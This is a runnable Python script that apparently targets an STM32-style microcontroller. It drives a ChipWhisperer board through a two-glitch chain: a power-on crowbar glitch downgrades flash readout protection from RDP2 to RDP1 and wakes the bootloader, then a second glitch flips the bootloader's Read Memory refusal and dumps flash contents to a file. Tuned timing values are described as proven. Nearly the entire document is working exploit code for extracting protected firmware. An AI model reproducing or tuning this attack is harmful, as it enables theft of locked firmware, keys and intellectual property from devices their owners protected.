#!/usr/bin/env python
"""glitch2_chain.py - full two-glitch chain on the RDP2 chip (no SWD, no FPB).

Phase 1 (glitch-1): power-on crowbar glitch, BOOT0 high, until the system
  bootloader comes alive (0x7F -> 0x79). That = RDP2->RDP1 downgrade landed;
  power is then HELD so the transient RDP1 persists.
Phase 2 (glitch-2): in that same session, trigger on the 0x11 Read-Memory burst
  (TIO3) and glitch the RDP1 refusal. A flipped command ACKs (0x79) instead of
  NACKing (0x1F); complete the Read Memory -> dump TARGET_N bytes.

One clkgen (100 MHz) for both phases (no mid-session clock change). One glitch-1
gets the bootloader; then hammer glitch-2 until a read flips. If a glitch-2 shot
browns the chip out (bootloader dies), fall back to glitch-1.

Env: G2_ADDR(0x08000000) G2_EXT_MIN/MAX/STEP G2_SHOTS.
"""
import os, sys, time, random
from datetime import datetime
import chipwhisperer as cw
import serial
from serialfind import find_ftdi

CLKGEN = 100e6
# glitch-1 (proven: power-on, BOOT0 high, ~2.4-4.8us)
G1_REP=20; G1_OFF=-45; G1_EXT_LO=240; G1_EXT_HI=480; POWER_OFF_MS=60
# glitch-2 (Read-Memory RDP flip)
TARGET_ADDR=int(os.environ.get('G2_ADDR','0x08000000'),16)
TARGET_N=256
G2_EXT_MIN=int(os.environ.get('G2_EXT_MIN',17000))    # ~170us @100MHz
G2_EXT_MAX=int(os.environ.get('G2_EXT_MAX',19500))    # ~195us
G2_EXT_STEP=int(os.environ.get('G2_EXT_STEP',2))
G2_REP_LO=int(os.environ.get('G2_REP_LO',4)); G2_REP_HI=int(os.environ.get('G2_REP_HI',5))  # ~40-50ns @100MHz = proven 36-42ns
G2_SHOTS=int(os.environ.get('G2_SHOTS',40000))

UART=find_ftdi()
scope=None; ser=None


def setup():
    s=cw.scope(); s.clock.clkgen_freq=CLKGEN
    s.adc.samples=24400
    s.glitch.clk_src='clkgen'; s.glitch.output='enable_only'; s.glitch.trigger_src='ext_single'
    s.glitch.width=40; s.glitch.offset=G1_OFF
    s.io.glitch_lp=True; s.io.glitch_hp=True
    s.io.tio1=True      # BOOT0 high -> system bootloader
    s.io.tio2=False     # BOOT1 low
    s.io.tio3='high_z'; s.io.tio4='high_z'
    s.io.target_pwr=True
    return s


def serial_open():
    return serial.Serial(UART,115200,bytesize=8,parity='E',stopbits=1,timeout=0.08)


# ---------------- Phase 1: glitch-1 -> bootloader ----------------
def g1_power_on(ext):
    scope.trigger.triggers='tio4'
    scope.glitch.ext_offset=ext
    scope.glitch.repeat=G1_REP
    scope.io.tio4='high_z'
    scope.io.target_pwr=False
    time.sleep(POWER_OFF_MS/1000.0)
    scope.arm()
    scope.io.target_pwr=True


def bootloader_ack():
    for _ in range(3):
        ser.reset_input_buffer(); ser.write(b'\x7f'); r=ser.read(4)
        if b'\x79' in r: return True
    return False


def get_bootloader():
    for i in range(1, 4000):
        g1_power_on(random.randint(G1_EXT_LO,G1_EXT_HI))
        time.sleep(0.06)
        if bootloader_ack():
            print(f'[G1] *** bootloader ALIVE after {i} shots *** (RDP2->RDP1, power held)', flush=True)
            return True
        if i%100==0: print(f'[G1] {i} shots, no bootloader yet', flush=True)
    return False


# ---------------- Phase 2: glitch-2 Read Memory ----------------
def complete_read(addr, nbytes):
    ab=addr.to_bytes(4,'big')
    ser.write(ab+bytes([ab[0]^ab[1]^ab[2]^ab[3]]))
    r=ser.read(8)
    if not r or r[0]!=0x79: return None,f'addr refused:{(r.hex() if r else "()")}'
    n1=nbytes-1
    ser.write(bytes([n1,n1^0xFF]))
    r=ser.read(nbytes+16)
    if not r or r[0]!=0x79: return None,f'len refused:{(r.hex()[:16] if r else "()")}'
    return r[1:1+nbytes],None


def g2_attempt(ext, rep):
    scope.glitch.ext_offset=ext
    scope.glitch.repeat=rep
    scope.arm()
    ser.reset_input_buffer()
    ser.write(b'\x11\xee')              # TIO3 triggers glitch-2 on this burst
    r=ser.read(16)
    try: scope.io.vglitch_reset()
    except Exception: pass
    if r and 0x79 in r:
        data,note=complete_read(TARGET_ADDR,TARGET_N)
        if data: return 'SUCCESS',data,f'pre={r.hex()[:12]}'
        return 'ACK_NO_DATA',None,f'pre={r.hex()[:12]} {note}'
    if r and r.count(0x1F)>=4: return 'spam',None,''
    if r and 0x1F in r: return 'nack',None,''
    if not r: return 'dead',None,''
    return 'weird',None,r.hex()[:16]


def main():
    global scope,ser
    print('='*70)
    print(f'TWO-GLITCH CHAIN  clkgen={CLKGEN/1e6:g}MHz  UART={UART}')
    print(f'glitch-2 target 0x{TARGET_ADDR:08x} x{TARGET_N}  ext {G2_EXT_MIN}-{G2_EXT_MAX} '
          f'({G2_EXT_MIN/100:.0f}-{G2_EXT_MAX/100:.0f}us) rep {G2_REP_LO}-{G2_REP_HI}')
    print('='*70)
    scope=setup(); ser=serial_open()
    os.makedirs('dumps',exist_ok=True)
    tally={}; cycles=0
    while cycles < 50:
        cycles+=1
        if not get_bootloader():
            print('[!] glitch-1 never got the bootloader - abort.'); return finish(1)
        scope.trigger.triggers='tio3'; scope.io.tio3='high_z'
        print('[G2] hammering Read Memory for the RDP flip...', flush=True)
        ext=G2_EXT_MIN; shot=0; alive=True
        while shot<G2_SHOTS and alive:
            for _s in range(2):
                shot+=1
                v,data,note=g2_attempt(ext, random.randint(G2_REP_LO,G2_REP_HI))
                tally[v]=tally.get(v,0)+1
                if v in ('SUCCESS','ACK_NO_DATA') or shot%250==0:
                    print(f'  [{datetime.now():%H:%M:%S}] #{shot} ext={ext}({ext/100:.1f}us) -> {v} {note}  {dict(tally)}', flush=True)
                if v=='SUCCESS':
                    o=f'dumps/g2chain_{TARGET_ADDR:08x}.bin'; open(o,'wb').write(data)
                    print(f'\n[***] *** TWO-GLITCH CHAIN SUCCESS *** 0x{TARGET_ADDR:08x} x{TARGET_N} -> {o}', flush=True)
                    print('      head:', data[:32].hex(), flush=True)
                    return finish(0)
                if v=='dead' and not bootloader_ack():
                    print(f'  [G2] bootloader died at #{shot} -> re-glitch-1', flush=True)
                    alive=False; break
            ext+=G2_EXT_STEP
            if ext>G2_EXT_MAX: ext=G2_EXT_MIN
        print(f'[G2] cycle {cycles} tally: {tally}', flush=True)
    return finish(1)


def finish(rc):
    try: ser.close()
    except Exception: pass
    try:
        scope.io.glitch_hp=False; scope.io.glitch_lp=False
        scope.io.target_pwr=False; scope.dis()
    except Exception: pass
    return rc


if __name__ == '__main__':
    sys.exit(main() or 0)
